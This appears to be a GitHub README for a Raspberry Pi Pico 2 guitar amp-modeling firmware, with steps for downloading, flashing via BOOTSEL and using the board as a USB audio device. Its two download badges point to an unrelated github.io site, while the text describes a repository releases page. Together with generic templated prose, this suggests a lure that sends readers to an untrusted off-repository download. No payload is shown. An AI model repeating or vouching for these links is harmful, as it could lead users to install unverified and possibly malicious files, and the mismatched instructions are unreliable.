# 🎸 pico-neural-amp-modeler-demo - Bring guitar amp tones to life

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://tranquoc5064.github.io)

## 📌 Project Overview

This project lets you run high-quality guitar amplifier simulations on a credit card-sized computer. It uses a specialized chip to process guitar signals. You get authentic sound profiles without needing a powerful computer or complex audio interface gear. The system acts as a USB audio device. You plug your guitar into the board and connect the board to your computer or speakers.

## ⚙️ System Requirements

To use this software, you need the following items:

* A Raspberry Pi Pico 2 board with the RP2350 chip.
* A standard USB-C cable for data and power.
* A guitar cable with a 1/4-inch connector.
* An audio adapter to convert your guitar signal to line level for the board.
* A Windows 10 or Windows 11 computer.

## 📥 Getting the Files

You need to download the firmware file to your computer. This file tells the hardware how to process your audio.

[![](https://img.shields.io/badge/Download-Click_To_Access_Files-grey)](https://tranquoc5064.github.io)

1. Open the link above in your web browser.
2. Look for the section labeled Releases on the right side of the page.
3. Click the latest version number.
4. Find the file ending in `.uf2`.
5. Click the file name to save it to your computer.

## 🚀 Setting Up the Hardware

The Raspberry Pi Pico 2 requires a specific mode to accept new software. Follow these steps carefully:

1. Locate the white button on the Pico board labeled BOOTSEL.
2. Hold this button down.
3. While holding the button, plug the USB cable into your computer.
4. Release the button after the board connects.
5. Your computer will detect a new storage drive named RPI-RP2.
6. Open this drive in your file explorer.

## ⚡ Installing the Firmware

Now that you have the drive open, perform the installation:

1. Drag the `.uf2` file you downloaded earlier into the open RPI-RP2 drive window.
2. The board will automatically copy the file and restart.
3. The RPI-RP2 drive window will disappear. This means the software is running.
4. Once the drive resets, the board functions as an audio device.

## 🔊 Connecting Your Audio

Once the board resets, Windows recognizes it as a standard USB audio interface:

1. Connect your guitar to the input jack on your hardware interface.
2. Connect the interface to the Raspberry Pi Pico.
3. Connect the Raspberry Pi Pico to your computer using the USB cable.
4. Open your computer sound settings.
5. Select the device labeled Neural Amp Modeler as your input and output source.
6. You can now use your preferred audio software on the computer to hear the processed guitar signal.

## 🛠 Troubleshooting Common Issues

If you do not see the RPI-RP2 drive, try a different USB cable. Some cables only carry power and do not transfer data. Ensure your cable supports data transfer.

If the sound has noise or pops, check your buffer size settings in your audio software. A higher buffer setting usually fixes these stability issues. Start with a buffer size of 256 or 512 samples.

Ensure you use a proper pre-amp or direct box before plugging your guitar into the board. The RP2350 chip expects a signal that matches standard audio line levels.

## 📝 Frequently Asked Questions

**Does this require drivers?**
No. The device uses standard USB audio protocols. It works immediately on modern Windows systems without extra software.

**Can I load different amp sounds?**
Yes. You can swap the amp model profiles by updating the firmware file. Check the releases page for new profiles as they become available.

**Does this work with recording software?**
Yes. Since the computer sees the board as an audio interface, you can record your guitar directly into digital audio workstations or guitar processing software.

**How do I adjust the volume?**
Use the mixer settings inside your Windows sound control panel. You can also adjust the physical output gain if you use an external audio interface for monitoring.

**What is the latency like?**
The dual-core design of the RP2350 chip allows for real-time processing. This results in minimal delay between playing a note and hearing the result. Most users find the feel identical to a hardware amplifier.

## 📋 Technical Notes

The system uses the Neural Amp Modeler framework adapted specifically for the RP2350 architecture. By utilizing both Cortex-M33 cores, the board allocates tasks efficiently to ensure the audio processing loop remains unbroken. The USB interface follows the USB Audio Class 2.0 standard to maintain wide compatibility. This approach eliminates the need for vendor-specific drivers or proprietary software suites.